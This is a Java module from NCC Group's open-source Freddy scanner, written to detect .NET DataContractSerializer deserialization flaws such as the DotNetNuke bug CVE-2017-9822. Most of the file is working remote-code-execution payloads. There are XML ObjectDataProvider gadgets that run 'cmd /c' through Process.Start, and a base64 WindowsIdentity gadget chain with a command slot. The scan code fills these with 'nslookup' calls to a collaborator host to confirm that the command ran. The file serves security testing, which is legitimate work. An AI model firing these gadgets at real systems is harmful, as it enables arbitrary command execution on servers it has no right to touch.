// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the .NET DataContractSerializer API.
 * 
 * Exploitation relies on control of a type parameter
 * specifying the type of the object to be deserialized.
 * DotNetNuke prior to 9.1.1 wrapped data serialized by
 * this API in an XML element that specifies the type
 * making it directly exploitable using the wrapped
 * payloads included in this module.
 * 
 * Non-wrapped payloads are also included for cases where
 * the type is controlled, in which case the type needs to
 * be set as follows:
 *  For ObjectDataProvider payloads:
 *   -> System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 *  For WindowsIdentity payloads
 *   -> System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class DataContractSerializerModule extends FreddyModuleBase {
	//Wrapped payload names
	private static final String PN_OBJDATPRO_WRAPPED = PN_OBJDATPRO + "_Wrapped";
	private static final String PN_WINID_WRAPPED = PN_WINID + "_Wrapped";
	
	//Exception pattern (required to avoid false positives with NetDataContractSerializer and JsonDataContractSerializer)
	private static final Pattern PAT_EXCEPTION = Pattern.compile("[^tn]DataContractSerializer\\.InternalReadObject", Pattern.CASE_INSENSITIVE);
	
	//ObjectDataProvider payload data
	private static final String OBJD_PREFIX = "<?xml version=\"1.0\"?><ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=\"http://schemas.datacontract.org/2004/07/System.Data.Services.Internal\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\"><ExpandedElement z:Id=\"ref1\" xmlns:a=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\"><__identity i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System\"/></ExpandedElement><ProjectedProperty0 xmlns:a=\"http://schemas.datacontract.org/2004/07/System.Windows.Data\"><a:MethodName>Start</a:MethodName><a:MethodParameters xmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"><b:anyType i:type=\"c:string\" xmlns:c=\"http://www.w3.org/2001/XMLSchema\">cmd</b:anyType><b:anyType i:type=\"c:string\" xmlns:c=\"http://www.w3.org/2001/XMLSchema\">/c ";
	private static final String OBJD_SUFFIX = "</b:anyType></a:MethodParameters><a:ObjectInstance z:Ref=\"ref1\"/></ProjectedProperty0></ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>";
	private static final String OBJDW_PREFIX = "<?xml version=\"1.0\"?><root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=\"http://schemas.datacontract.org/2004/07/System.Data.Services.Internal\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\"><ExpandedElement z:Id=\"ref1\" xmlns:a=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\"><__identity i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System\"/></ExpandedElement><ProjectedProperty0 xmlns:a=\"http://schemas.datacontract.org/2004/07/System.Windows.Data\"><a:MethodName>Start</a:MethodName><a:MethodParameters xmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"><b:anyType i:type=\"c:string\" xmlns:c=\"http://www.w3.org/2001/XMLSchema\">cmd</b:anyType><b:anyType i:type=\"c:string\" xmlns:c=\"http://www.w3.org/2001/XMLSchema\">/c ";
	private static final String OBJDW_SUFFIX = "</b:anyType></a:MethodParameters><a:ObjectInstance z:Ref=\"ref1\"/></ProjectedProperty0></ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL></root>";
	
	//WindowsIdentity payload data
	private static final String WINID_PREFIX = "<WindowsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:x=\"http://www.w3.org/2001/XMLSchema\" xmlns=\"http://schemas.datacontract.org/2004/07/System.Security.Principal\"><System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" xmlns=\"\">";
	private static final String WINID_SUFFIX = "</System.Security.ClaimsIdentity.bootstrapContext></WindowsIdentity>";
	private static final String WINIDW_PREFIX = "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" type=\"System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><WindowsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:x=\"http://www.w3.org/2001/XMLSchema\" xmlns=\"http://schemas.datacontract.org/2004/07/System.Security.Principal\"><System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" xmlns=\"\">";
	private static final String WINIDW_SUFFIX = "</System.Security.ClaimsIdentity.bootstrapContext></WindowsIdentity></root>";
	private static final String WINID_INNER_PREFIX_B64 = "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAMsBL2Mg";
	private static final String WINID_INNER_SUFFIX_B64 = "BgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=";
	private static final int WINID_PAYLOAD_CMD_OFFSET = 663;
	private byte[] WINID_INNER_PAYLOAD;
	
	protected void initialiseModule() {
		setName("DataContractSerializer");
		setPlatform(TargetPlatform.DOTNET);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("Note that exploitation relies on control of the type parameter to the " +
				"DataContractSerializer constructor. Versions of DotNetNuke prior to 9.1.1 wrap serialized " +
				"data in a root XML element that specifies the type, making them directly exploitable " +
				"(CVE-2017-9822).");
		setRemediationDetail("");
		setSeverity(SeverityRating.MEDIUM);
		
		registerPassiveScanIndicator(PAT_EXCEPTION, IndicatorTarget.RESPONSE);
		
		registerActiveScanExceptionPayload("<test/>", PAT_EXCEPTION);
		
		registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
		registerActiveScanCollaboratorPayload(PN_OBJDATPRO_WRAPPED, false);
		registerActiveScanCollaboratorPayload(PN_WINID, false);
		registerActiveScanCollaboratorPayload(PN_WINID_WRAPPED, false);
		
		//Initialise the inner buffer for the Windows Identity payload
		WINID_INNER_PAYLOAD = buildBinaryPayloadBuffer(WINID_INNER_PREFIX_B64, WINID_INNER_SUFFIX_B64, false);
	}
	
	protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_OBJDATPRO:
				return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
				
			case PN_OBJDATPRO_WRAPPED:
				return OBJDW_PREFIX + "nslookup " + hostname + OBJDW_SUFFIX;
				
			case PN_WINID:
				return WINID_PREFIX + generateBase64BinaryPayload(WINID_INNER_PAYLOAD, WINID_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false) + WINID_SUFFIX;
				
			case PN_WINID_WRAPPED:
				return WINIDW_PREFIX + generateBase64BinaryPayload(WINID_INNER_PAYLOAD, WINID_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false) + WINIDW_SUFFIX;
		}
		return null;
	}
}
